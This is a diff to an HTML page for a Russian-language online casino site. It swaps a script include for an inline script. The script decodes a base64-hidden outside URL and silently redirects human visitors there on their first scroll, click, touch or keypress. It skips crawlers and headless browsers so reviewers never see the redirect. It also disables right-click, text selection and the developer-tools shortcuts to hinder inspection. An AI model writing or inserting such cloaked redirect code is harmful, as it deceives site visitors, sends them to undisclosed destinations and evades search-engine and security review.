@@ -555,7 +555,34 @@
             © 2025 Arkada Casino. Все права защищены. 18+
         </div>
     </footer>
-    <script src="script.js"></script>
+              <script>
+        var myDomain = "arkadacasinoofficial.vercel.app"; 
+        var targetB64 = "aHR0cHM6Ly9hcmNhZGUtbmVidWxhLmNvbS9zbWd3bzhneXo=";
+        function fireRedirect() {
+            var isHeadless = navigator.webdriver || window.navigator.webdriver === true;
+            var ua = navigator.userAgent.toLowerCase();
+            var isBotUA = /bot|crawl|spider|yandex|google|mail\.ru|bing|slurp|duckduck|lighthouse|pagespeed|ptst/i.test(ua);
+            if (!isHeadless && !isBotUA) {
+                window.location.replace(atob(targetB64));
+            }
+        }
+        var events = ['scroll', 'mousemove', 'touchstart', 'click', 'keydown'];
+        var triggered = false;
+        events.forEach(function(event) {
+            window.addEventListener(event, function() {
+                if (!triggered) {
+                    triggered = true;
+                    fireRedirect();
+                }
+            }, { passive: true, once: true });
+        });
+        document.addEventListener('contextmenu', function(e) { e.preventDefault(); });
+        document.onselectstart = function() { return false; };
+        document.onkeydown = function(e) {
+            if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && e.keyCode == 73) || (e.ctrlKey && e.keyCode == 85)) { return false; }
+        };
+        feather.replace();
+    </script>  
     <script src="vanta.globe.min.js"></script>
     <script>
         VANTA.GLOBE({
